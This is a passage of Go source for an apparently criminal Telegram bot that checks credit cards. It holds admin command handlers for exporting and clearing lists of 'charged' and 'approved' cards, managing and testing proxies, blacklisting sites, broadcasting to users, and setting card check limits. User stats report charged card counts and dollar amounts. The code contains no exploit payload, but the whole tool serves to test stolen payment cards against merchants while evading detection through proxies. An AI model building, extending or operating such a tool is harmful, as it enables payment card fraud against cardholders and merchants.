                                em("5264727218734524899", "🔄")+"  /recheck           — Force recheck all sites now\n\n"+
                                em("5247120584420114337", "⚡")+"  /active            — Active sessions\n"+
                                em("5461137245706685869", "🛑")+"  /stop              — Stop your own session (also /stopall)\n"+
                                em("5461137245706685869", "🛑")+"  /stopuser &lt;@user|id&gt; — Stop specific user\n"+
                                em("5461137245706685869", "🛑")+"  /resetactive       — Force-cancel all sessions\n\n"+
                                em("5816625186216090280", "🔌")+"  /show &lt;id&gt;         — Show user's proxies\n"+
                                em("5458720093947063184", "🧹")+"  /cleanproxies      — Clean invalid proxy entries\n"+
                                em("5231012545799666522", "🔍")+"  /chkpr &lt;id&gt;        — Test user's proxies\n\n"+
                                em("5224450179368767019", "🌍")+"  /addgp &lt;id&gt;        — Add allowed group\n"+
                                em("5197269100878907942", "📋")+"  /showgp            — Show groups &amp; mode\n"+
                                em("6057529472351999246", "🗑")+"  /delgp &lt;id&gt;        — Remove group\n"+
                                em("5296369303661067030", "🔒")+"  /onlygp            — Groups-only mode\n"+
                                em("5296369303661067030", "🔓")+"  /allowall          — Allow all (private + groups)\n\n"+
                                em("5264727218734524899", "🔄")+"  /reboot            — Restart bot\n\n"+
                                em("5393194986252542669", "📅")+"  /logon             — Enable full logs channel\n"+
                                em("5382261056078881010", "📅")+"  /logoff            — Disable full logs channel\n\n"+
                                em("5254411247940816486", "💳")+"  /chargeall         — Export all charged cards (.txt)\n"+
                                em("5197269100878907942", "✅")+"  /approvedall       — Export all approved cards (.txt)\n\n"+
                                em("5461137245706685869", "🗑")+"  /clearcharged      — Clear charged cards list (memory)\n"+
                                em("5461137245706685869", "🗑")+"  /clearapproved     — Clear approved cards list (memory)\n"+
                                em("5461137245706685869", "🗑")+"  /clearproxies      — Clear YOUR proxies from DB\n"+
                                em("5461137245706685869", "🗑")+"  /clearallproxies   — Clear ALL users' proxies from DB\n"+
                                em("5461137245706685869", "🗑")+"  /clearblacklist    — Clear blacklist from DB\n"+
                                em("5461137245706685869", "🗑")+"  /clearsessions     — Clear session history from DB\n"+
                                em("5461137245706685869", "🗑")+"  /clearproxyhealth  — Clear proxy health scores from DB",
                        tele.ModeHTML)
        })

        // /clearcharged — admin: wipe the in-memory charged cards list
        bot.Handle("/clearcharged", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Admin only.", tele.ModeHTML)
                }
                globalChargedMu.Lock()
                n := len(globalChargedCards)
                globalChargedCards = nil
                globalChargedMu.Unlock()
                return c.Send(fmt.Sprintf("🗑 Charged cards list cleared. <b>%d</b> entries removed.", n), tele.ModeHTML)
        })

        // /clearapproved — admin: wipe the in-memory approved cards list
        bot.Handle("/clearapproved", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Admin only.", tele.ModeHTML)
                }
                globalApprovedMu.Lock()
                n := len(globalApprovedCards)
                globalApprovedCards = nil
                globalApprovedMu.Unlock()
                return c.Send(fmt.Sprintf("🗑 Approved cards list cleared. <b>%d</b> entries removed.", n), tele.ModeHTML)
        })

        // /clearproxies — clear YOUR OWN proxies (any user)
        bot.Handle("/clearproxies", func(c tele.Context) error {
                uid := c.Sender().ID
                ud := um.Get(uid)
                n := len(ud.Proxies)
                if n == 0 {
                        return c.Send(em(emojiWarn, "⚠️")+" You have no proxies to clear.", tele.ModeHTML)
                }
                um.mu.Lock()
                ud.Proxies = nil
                um.mu.Unlock()
                _ = mongoSaveUser(uid, c.Sender().Username, ud)
                return c.Send(fmt.Sprintf("🗑 Your proxies cleared. <b>%d</b> removed from DB.", n), tele.ModeHTML)
        })

        // /clearallproxies — admin: wipe proxies for every user in DB
        bot.Handle("/clearallproxies", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Admin only.", tele.ModeHTML)
                }
                // Clear in-memory user manager too
                um.mu.Lock()
                for _, ud := range um.users {
                        ud.Proxies = nil
                }
                um.mu.Unlock()
                // Bulk-update MongoDB
                n, err := mongoClearAllUserProxies()
                if err != nil {
                        return c.Send("❌ DB error: "+err.Error(), tele.ModeHTML)
                }
                return c.Send(fmt.Sprintf("🗑 All proxies cleared. <b>%d</b> users updated in DB.", n), tele.ModeHTML)
        })

        // /clearblacklist — admin: wipe blacklist from memory + MongoDB
        bot.Handle("/clearblacklist", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Admin only.", tele.ModeHTML)
                }
                blacklistMu.Lock()
                n := len(blacklisted)
                blacklisted = make(map[string]bool)
                blacklistMu.Unlock()
                _ = mongoSaveBlacklist([]string{})
                return c.Send(fmt.Sprintf("🗑 Blacklist cleared. <b>%d</b> sites removed from DB.", n), tele.ModeHTML)
        })

        // /clearsessions — admin: delete all session history from MongoDB
        bot.Handle("/clearsessions", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Admin only.", tele.ModeHTML)
                }
                n, err := mongoDeleteAllSessions()
                if err != nil {
                        return c.Send("❌ DB error: "+err.Error(), tele.ModeHTML)
                }
                return c.Send(fmt.Sprintf("🗑 Session history cleared. <b>%d</b> records deleted from DB.", n), tele.ModeHTML)
        })

        // /clearproxyhealth — admin: delete all proxy health records from MongoDB
        bot.Handle("/clearproxyhealth", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Admin only.", tele.ModeHTML)
                }
                n, err := mongoDeleteAllProxyHealth()
                if err != nil {
                        return c.Send("❌ DB error: "+err.Error(), tele.ModeHTML)
                }
                return c.Send(fmt.Sprintf("🗑 Proxy health records cleared. <b>%d</b> entries deleted from DB.", n), tele.ModeHTML)
        })

        // /broadcast — send message to all known users
        bot.Handle("/broadcast", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                fullText := c.Message().Text
                idx := strings.Index(fullText, " ")
                if idx < 0 || strings.TrimSpace(fullText[idx:]) == "" {
                        return c.Send("Usage: /broadcast <message>")
                }
                msg := strings.TrimSpace(fullText[idx:])
                ids := um.AllIDs()
                sent, failed := 0, 0
                for _, uid := range ids {
                        _, err := bot.Send(tele.ChatID(uid), "📢 "+msg)
                        if err != nil {
                                failed++
                        } else {
                                sent++
                        }
                }
                return c.Send(fmt.Sprintf("📢 Broadcast complete\n✅ Sent: %d\n❌ Failed: %d", sent, failed))
        })

        // /broadcastuser <id|@user> <message> — admin only
        bot.Handle("/broadcastuser", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                parts := strings.SplitN(strings.TrimSpace(c.Message().Payload), " ", 2)
                if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
                        return c.Send("Usage: /broadcastuser <user_id> <message>")
                }
                uid, err := strconv.ParseInt(strings.TrimSpace(parts[0]), 10, 64)
                if err != nil {
                        return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
                }
                msg := strings.TrimSpace(parts[1])
                _, err = bot.Send(tele.ChatID(uid), "📢 "+msg)
                if err != nil {
                        return c.Send(fmt.Sprintf("❌ Failed to send: %v", err))
                }
                return c.Send(fmt.Sprintf("✅ Message sent to %d.", uid))
        })

        // /broadcastactive <message> — send to all users with active sessions
        bot.Handle("/broadcastactive", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                msg := strings.TrimSpace(c.Message().Payload)
                if msg == "" {
                        return c.Send("Usage: /broadcastactive <message>")
                }
                sent, failed := 0, 0
                activeSessions.Range(func(key, val any) bool {
                        sess := val.(*CheckSession)
                        _, err := bot.Send(tele.ChatID(sess.UserID), "📢 "+msg)
                        if err != nil {
                                failed++
                        } else {
                                sent++
                        }
                        return true
                })
                return c.Send(fmt.Sprintf("📢 Active broadcast\n✅ Sent: %d\n❌ Failed: %d", sent, failed))
        })

        // /me — show personal stats
        bot.Handle("/me", func(c tele.Context) error {
                uid := c.Sender().ID
                ud := um.Get(uid)
                um.mu.RLock()
                s := ud.Stats
                um.mu.RUnlock()
                approvedRate, chargedRate := 0.0, 0.0
                if s.TotalChecked > 0 {
                        approvedRate = float64(s.TotalApproved) * 100.0 / float64(s.TotalChecked)
                        chargedRate = float64(s.TotalCharged) * 100.0 / float64(s.TotalChecked)
                }
                return c.Send(fmt.Sprintf(
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
                                "    👤  𝗣𝗲𝗿𝘀𝗼𝗻𝗮𝗹 𝗦𝘁𝗮𝘁𝘀\n"+
                                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"+
                                "┌────────────────────────────┐\n"+
                                "│                              │\n"+
                                "│  📋  Total Checked  ∣  %6d  │\n"+
                                "│  ✅  Approved       ∣  %6d  │\n"+
                                "│  ❌  Declined       ∣  %6d  │\n"+
                                "│  💳  Charged        ∣  %6d  │\n"+
                                "│                              │\n"+
                                "└────────────────────────────┘\n\n"+
                                "💰  𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗔𝗺𝗼𝘂𝗻𝘁: $%.2f\n"+
                                "📈  ✅ Approved: %.1f%%  💳 Charged: %.1f%%\n"+
                                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                        s.TotalChecked, s.TotalApproved, s.TotalDeclined, s.TotalCharged,
                        s.TotalChargedAmt, approvedRate, chargedRate))
        })

        // /resetstats — admin: reset all global stats
        bot.Handle("/resetstats", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                um.mu.Lock()
                for _, ud := range um.users {
                        ud.Stats = UserStats{}
                }
                um.mu.Unlock()
                um.Save()
                return c.Send("✅ All stats have been reset.")
        })

        // /restrict [all|id,...] — admin: block all non-admins or specific IDs
        bot.Handle("/restrict", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                arg := strings.TrimSpace(c.Message().Payload)
                if arg == "" {
                        return c.Send("Usage: /restrict all  or  /restrict <id1,id2,...>")
                }
                if strings.ToLower(arg) == "all" {
                        cfg.mu.Lock()
                        cfg.RestrictAll = true
                        cfg.mu.Unlock()
                        cfg.Save()
                        return c.Send("🔒 Bot restricted — only explicitly allowed users can access.")
                }
                cfg.mu.Lock()
                for _, tok := range strings.Split(arg, ",") {
                        uid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
                        if err != nil {
                                continue
                        }
                        found := false
                        for _, b := range cfg.BlockedIDs {
                                if b == uid {
                                        found = true
                                        break
                                }
                        }
                        if !found {
                                cfg.BlockedIDs = append(cfg.BlockedIDs, uid)
                        }
                }
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send(fmt.Sprintf("🔒 Restricted IDs updated: %v", cfg.BlockedIDs))
        })

        // /allowonly <id1,id2,...> — admin: set allow-only list and enable restrict_all
        bot.Handle("/allowonly", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                arg := strings.TrimSpace(c.Message().Payload)
                if arg == "" {
                        return c.Send("Usage: /allowonly <id1,id2,...>")
                }
                var ids []int64
                for _, tok := range strings.Split(arg, ",") {
                        uid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
                        if err != nil {
                                continue
                        }
                        ids = append(ids, uid)
                }
                if len(ids) == 0 {
                        return c.Send("❌ No valid IDs found.")
                }
                cfg.mu.Lock()
                cfg.AllowOnlyIDs = ids
                cfg.RestrictAll = true
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send(fmt.Sprintf("✅ Allow-only mode enabled for: %v", ids))
        })

        // /unrestrict [all|id,...] — admin: lift restrictions
        bot.Handle("/unrestrict", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                arg := strings.TrimSpace(c.Message().Payload)
                if arg == "" {
                        return c.Send("Usage: /unrestrict all  or  /unrestrict <id1,id2,...>")
                }
                if strings.ToLower(arg) == "all" {
                        cfg.mu.Lock()
                        cfg.RestrictAll = false
                        cfg.BlockedIDs = nil
                        cfg.AllowOnlyIDs = nil
                        cfg.mu.Unlock()
                        cfg.Save()
                        return c.Send("🔓 All restrictions cleared.")
                }
                cfg.mu.Lock()
                for _, tok := range strings.Split(arg, ",") {
                        uid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
                        if err != nil {
                                continue
                        }
                        newList := cfg.BlockedIDs[:0]
                        for _, b := range cfg.BlockedIDs {
                                if b != uid {
                                        newList = append(newList, b)
                                }
                        }
                        cfg.BlockedIDs = newList
                }
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send(fmt.Sprintf("🔓 Blocked IDs updated: %v", cfg.BlockedIDs))
        })

        // /admins — list all admins
        bot.Handle("/admins", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                var sb strings.Builder
                sb.WriteString("👑 Admins:\n")
                for id := range adminIDs {
                        sb.WriteString(fmt.Sprintf("• %d (hardcoded)\n", id))
                }
                cfg.mu.RLock()
                for _, id := range cfg.DynamicAdmins {
                        if !adminIDs[id] {
                                sb.WriteString(fmt.Sprintf("• %d\n", id))
                        }
                }
                cfg.mu.RUnlock()
                return c.Send(sb.String())
        })

        // /addadmin <id> — add dynamic admin
        bot.Handle("/addadmin", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                raw := strings.TrimSpace(c.Message().Payload)
                if raw == "" {
                        return c.Send("Usage: /addadmin <user_id>")
                }
                uid, err := strconv.ParseInt(raw, 10, 64)
                if err != nil {
                        return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
                }
                cfg.mu.Lock()
                found := false
                for _, a := range cfg.DynamicAdmins {
                        if a == uid {
                                found = true
                                break
                        }
                }
                if !found {
                        cfg.DynamicAdmins = append(cfg.DynamicAdmins, uid)
                }
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d added as admin.", uid), tele.ModeHTML)
        })

        // /rmadmin <id> — remove dynamic admin (cannot remove hardcoded)
        bot.Handle("/rmadmin", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                raw := strings.TrimSpace(c.Message().Payload)
                if raw == "" {
                        return c.Send("Usage: /rmadmin <user_id>")
                }
                uid, err := strconv.ParseInt(raw, 10, 64)
                if err != nil {
                        return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
                }
                if adminIDs[uid] {
                        return c.Send("❌ Cannot remove hardcoded admin.")
                }
                cfg.mu.Lock()
                newList := cfg.DynamicAdmins[:0]
                for _, a := range cfg.DynamicAdmins {
                        if a != uid {
                                newList = append(newList, a)
                        }
                }
                cfg.DynamicAdmins = newList
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d removed from admins.", uid), tele.ModeHTML)
        })

        // /giveperm <id> <cmd> — grant specific command permission to a user
// /giveperm <id> <cmd|premium|credits> [amount] — grant permission, premium, or credits
bot.Handle("/giveperm", func(c tele.Context) error {
if !isAdmin(c.Sender().ID) {
return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
}
parts := strings.Fields(strings.TrimSpace(c.Message().Payload))
if len(parts) < 2 {
return c.Send("Usage: /giveperm <user_id> <command|premium|credits> [amount]")
}

uid, err := strconv.ParseInt(strings.TrimSpace(parts[0]), 10, 64)
if err != nil {
return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
}

action := strings.ToLower(parts[1])
ud := um.Get(uid)

if action == "premium" {
ud.IsPremium = true
if len(parts) > 2 {
ud.ExpireDate = parts[2]
} else {
ud.ExpireDate = time.Now().AddDate(0, 1, 0).Format("2006-01-02 15:04")
}
return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d granted Premium status until %s.", uid, ud.ExpireDate), tele.ModeHTML)
}

if action == "credits" {
if len(parts) < 3 {
return c.Send("Usage: /giveperm <user_id> credits <amount>")
}
credits, err := strconv.Atoi(parts[2])
if err != nil {
return c.Send(em(emojiCross, "❌")+" Invalid credit amount.", tele.ModeHTML)
}
ud.Credits += credits
return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d received %d credits (Total: %d).", uid, credits, ud.Credits), tele.ModeHTML)
}

// Default: grant command permission
cmd := action
key := strconv.FormatInt(uid, 10)
cfg.mu.Lock()
for _, p := range cfg.Perms[key] {
if p == cmd {
cfg.mu.Unlock()
return c.Send(fmt.Sprintf("ℹ️ User %d already has permission for /%s.", uid, cmd))
}
}
cfg.Perms[key] = append(cfg.Perms[key], cmd)
cfg.mu.Unlock()
cfg.Save()
return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d granted permission for /%s.", uid, cmd), tele.ModeHTML)
})


        // /users — list users in the allowed bypass list
        bot.Handle("/users", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                cfg.mu.RLock()
                allowed := make([]int64, 0, len(cfg.AllowedUsers))
                for uid := range cfg.AllowedUsers {
                        allowed = append(allowed, uid)
                }
                cfg.mu.RUnlock()
                if len(allowed) == 0 {
                        return c.Send("📋 Allowed Users List\n\nNo users in the allowed list.\n\nUse /allowuser <id> to add users.")
                }
                sort.Slice(allowed, func(i, j int) bool { return allowed[i] < allowed[j] })
                var sb strings.Builder
                sb.WriteString("📋 Allowed Users List\n\n")
                for i, uid := range allowed {
                        sb.WriteString(fmt.Sprintf("%d. %d\n", i+1, uid))
                }
                sb.WriteString(fmt.Sprintf("\nTotal: %d user(s)", len(allowed)))
                return c.Send(sb.String())
        })

        // /show [user_id] — show own proxies, or another user's if admin provides ID
        bot.Handle("/show", func(c tele.Context) error {
                uid := c.Sender().ID
                targetID := uid
                raw := strings.TrimSpace(c.Message().Payload)
                if raw != "" {
                        if !isAdmin(uid) {
                                return c.Send("🚫 Only admins can view other users' proxies.")
                        }
                        n, err := strconv.ParseInt(raw, 10, 64)
                        if err != nil {
                                return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
                        }
                        targetID = n
                }
                ud := um.Get(targetID)
                um.mu.RLock()
                proxies := make([]string, len(ud.Proxies))
                copy(proxies, ud.Proxies)
                um.mu.RUnlock()
                if len(proxies) == 0 {
                        if targetID == uid {
                                return c.Send("❌ You have no proxies set.")
                        }
                        return c.Send(fmt.Sprintf("❌ User %d has no proxies.", targetID))
                }
                var sb strings.Builder
                if targetID == uid {
                        sb.WriteString(fmt.Sprintf("🔌 Your proxies (%d):\n\n", len(proxies)))
                } else {
                        sb.WriteString(fmt.Sprintf("🔌 User %d proxies (%d):\n\n", targetID, len(proxies)))
                }
                for i, p := range proxies {
                        sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, p))
                }
                return c.Send(sb.String())
        })

        // /cleanproxies — remove blank/junk entries from all users' proxy lists
        bot.Handle("/cleanproxies", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                cleaned := 0
                um.mu.Lock()
                for _, ud := range um.users {
                        var valid []string
                        for _, p := range ud.Proxies {
                                p = strings.TrimSpace(p)
                                if p != "" && (strings.HasPrefix(p, "http://") || strings.HasPrefix(p, "https://") || strings.HasPrefix(p, "socks5://")) {
                                        valid = append(valid, p)
                                } else {
                                        cleaned++
                                }
                        }
                        ud.Proxies = valid
                }
                um.mu.Unlock()
                um.Save()
                return c.Send(fmt.Sprintf("✅ Cleaned %d invalid proxy entry/entries.", cleaned))
        })

        // /chkpr [user_id] — test proxies (own or specified user's, admin)
        bot.Handle("/chkpr", func(c tele.Context) error {
                uid := c.Sender().ID
                targetID := uid
                raw := strings.TrimSpace(c.Message().Payload)
                if raw != "" {
                        if !isAdmin(uid) {
                                return c.Send("🚫 Only admins can test other users' proxies.")
                        }
                        n, err := strconv.ParseInt(raw, 10, 64)
                        if err != nil {
                                return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
                        }
                        targetID = n
                }
                ud := um.Get(targetID)
                um.mu.RLock()
                proxies := make([]string, len(ud.Proxies))
                copy(proxies, ud.Proxies)
                um.mu.RUnlock()
                if len(proxies) == 0 {
                        return c.Send("❌ No proxies to test.")
                }
                msg, _ := bot.Send(c.Chat(), fmt.Sprintf("🔄 Testing %d proxies...", len(proxies)))
                type result struct {
                        proxy   string
                        ok      bool
                        latency time.Duration
                }
                results := make([]result, len(proxies))
                var wg sync.WaitGroup
                for i, p := range proxies {
                        wg.Add(1)
                        go func(idx int, proxy string) {
                                defer wg.Done()
                                start := time.Now()
                                err := testProxy(proxy)
                                results[idx] = result{proxy: proxy, ok: err == nil, latency: time.Since(start)}
                        }(i, p)
                }
                wg.Wait()
                good, bad := 0, 0
                var sb strings.Builder
                if targetID == uid {
                        sb.WriteString("🔌 Proxy Test Results:\n\n")
                } else {
                        sb.WriteString(fmt.Sprintf("🔌 Proxy Test Results for %d:\n\n", targetID))
                }
                for _, r := range results {
                        if r.ok {
                                sb.WriteString(fmt.Sprintf("✅ %s  <code>%v</code>\n", r.proxy, r.latency.Truncate(time.Millisecond)))
                                good++
                        } else {
                                sb.WriteString(fmt.Sprintf("❌ %s\n", r.proxy))
                                bad++
                        }
                }
                sb.WriteString(fmt.Sprintf("\n✅ Working: %d  ❌ Dead: %d", good, bad))
                if msg != nil {
                        bot.Edit(msg, sb.String())
                        return nil
                }
                return c.Send(sb.String())
        })

        // /stopuser <@username or user_id> — admin: stop a specific user's session
        bot.Handle("/stopuser", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                raw := strings.TrimSpace(c.Message().Payload)
                if raw == "" {
                        return c.Send("Usage: /stopuser <@username> or /stopuser <user_id>")
                }

                var targetUID int64
                var found bool

                if strings.HasPrefix(raw, "@") {
                        // search by username across active sessions
                        needle := strings.ToLower(strings.TrimPrefix(raw, "@"))
                        activeSessions.Range(func(_, val any) bool {
                                sess := val.(*CheckSession)
                                if strings.ToLower(sess.Username) == needle {
                                        targetUID = sess.UserID
                                        found = true
                                        return false
                                }
                                return true
                        })
                        if !found {
                                return c.Send(fmt.Sprintf("⚠️ No active session for %s.", raw))
                        }
                } else {
                        uid, err := strconv.ParseInt(raw, 10, 64)
                        if err != nil {
                                return c.Send("❌ Invalid argument. Use @username or a numeric user ID.")
                        }
                        targetUID = uid
                        _, found = activeSessions.Load(targetUID)
                        if !found {
                                return c.Send(fmt.Sprintf("⚠️ No active session for user %d.", targetUID))
                        }
                }

                val, _ := activeSessions.Load(targetUID)
                sess := val.(*CheckSession)
                sess.Cancelled.Store(true)
                if sess.Cancel != nil {
                        sess.Cancel()
                }
                return c.Send(fmt.Sprintf("🛑 Stopped session for @%s (ID: %d).", sess.Username, sess.UserID))
        })

        // /resetactive — force-cancel all active sessions
        bot.Handle("/resetactive", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                count := 0
                activeSessions.Range(func(key, val any) bool {
                        sess := val.(*CheckSession)
                        sess.Cancelled.Store(true)
                        if sess.Cancel != nil {
                                sess.Cancel()
                        }
                        activeSessions.Delete(key)
                        count++
                        return true
                })
                return c.Send(fmt.Sprintf("🛑 Force-cancelled %d session(s). Active sessions cleared.", count))
        })

        // /reboot — restart the bot process
        bot.Handle("/reboot", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                c.Send("🔄 Rebooting bot...")
                go func() {
                        time.Sleep(500 * time.Millisecond)
                        cmd := exec.Command(os.Args[0], os.Args[1:]...)
                        cmd.Stdout = os.Stdout
                        cmd.Stderr = os.Stderr
                        cmd.Stdin = os.Stdin
                        if err := cmd.Start(); err != nil {
                                fmt.Printf("[REBOOT] failed to restart: %v\n", err)
                        }
                        os.Exit(0)
                }()
                return nil
        })

        // /addgp <group_id> [...] — add group(s) to allowed list
        bot.Handle("/addgp", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                arg := strings.TrimSpace(c.Message().Payload)
                if arg == "" {
                        return c.Send("Usage: /addgp <group_id> [<group_id> ...]")
                }
                cfg.mu.Lock()
                for _, tok := range strings.Fields(arg) {
                        gid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
                        if err != nil {
                                continue
                        }
                        found := false
                        for _, g := range cfg.Groups {
                                if g == gid {
                                        found = true
                                        break
                                }
                        }
                        if !found {
                                cfg.Groups = append(cfg.Groups, gid)
                        }
                }
                groups := cfg.Groups
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send(fmt.Sprintf("✅ Allowed groups: %v", groups))
        })

        // /showgp — show allowed groups and groups-only mode status
        bot.Handle("/showgp", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                cfg.mu.RLock()
                groups := make([]int64, len(cfg.Groups))
                copy(groups, cfg.Groups)
                groupsOnly := cfg.GroupsOnly
                cfg.mu.RUnlock()
                var sb strings.Builder
                sb.WriteString("Allowed groups:\n")
                if len(groups) == 0 {
                        sb.WriteString("(none)\n")
                } else {
                        for _, g := range groups {
                                sb.WriteString(fmt.Sprintf("• %d\n", g))
                        }
                }
                sb.WriteString(fmt.Sprintf("\nGroups-only mode: %v", groupsOnly))
                return c.Send(sb.String())
        })

        // /delgp <group_id> [...] — remove group(s) from allowed list
        bot.Handle("/delgp", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                arg := strings.TrimSpace(c.Message().Payload)
                if arg == "" {
                        return c.Send("Usage: /delgp <group_id> [<group_id> ...]")
                }
                cfg.mu.Lock()
                toRemove := make(map[int64]bool)
                for _, tok := range strings.Fields(arg) {
                        gid, err := strconv.ParseInt(strings.TrimSpace(tok), 10, 64)
                        if err == nil {
                                toRemove[gid] = true
                        }
                }
                newList := cfg.Groups[:0]
                for _, g := range cfg.Groups {
                        if !toRemove[g] {
                                newList = append(newList, g)
                        }
                }
                cfg.Groups = newList
                groups := cfg.Groups
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send(fmt.Sprintf("✅ Removed. Current allowed groups: %v", groups))
        })

        // /onlygp — enable groups-only mode
        bot.Handle("/onlygp", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                cfg.mu.Lock()
                cfg.GroupsOnly = true
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send("🔒 Groups-only mode enabled. Private chats are denied unless /allowuser is set.")
        })

        // /allowall — disable groups-only, restrict_all, and allow_only restrictions
        bot.Handle("/allowall", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                cfg.mu.Lock()
                cfg.GroupsOnly = false
                cfg.AllowOnlyIDs = nil
                cfg.RestrictAll = false
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send("🔓 Bot set to allow all users in personal chats.")
        })

        // ── /limit — set card check limit (admin only) ─────────────────
        bot.Handle("/limit", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Only admin can use /limit", tele.ModeHTML)
                }
                args := strings.Fields(strings.TrimSpace(c.Message().Payload))
                if len(args) == 0 {
                        // Show current limits
                        cfg.mu.RLock()
                        global := cfg.GlobalCardLimit
                        userLimits := make(map[int64]int)
                        for k, v := range cfg.UserCardLimits {
                                userLimits[k] = v
                        }
                        cfg.mu.RUnlock()
                        var sb strings.Builder
                        sb.WriteString("📊 <b>Card Limits</b>\n━━━━━━━━━━━━━━━━━━━━━━\n")
                        if global == 0 {
                                sb.WriteString("🌐 Global: <b>Unlimited</b>\n")
                        } else {
                                sb.WriteString(fmt.Sprintf("🌐 Global: <b>%d cards</b>\n", global))
                        }
                        if len(userLimits) > 0 {
                                sb.WriteString("\n👤 Per-user limits:\n")
                                for uid, lim := range userLimits {
                                        sb.WriteString(fmt.Sprintf("  • <code>%d</code> → %d cards\n", uid, lim))
                                }
                        }
                        sb.WriteString("\n<b>Usage:</b>\n/limit <code>5000</code> — global limit\n/limit <code>userid 5000</code> — per-user limit\n/limit <code>0</code> — remove global limit\n/limit <code>userid 0</code> — remove user limit")
                        return c.Send(sb.String(), tele.ModeHTML)
                }
                if len(args) == 1 {
                        // /limit <number> — global limit
                        n, err := strconv.Atoi(args[0])
                        if err != nil || n < 0 {
                                return c.Send("❌ Invalid number. Usage: /limit 5000")
                        }
                        cfg.mu.Lock()
                        cfg.GlobalCardLimit = n
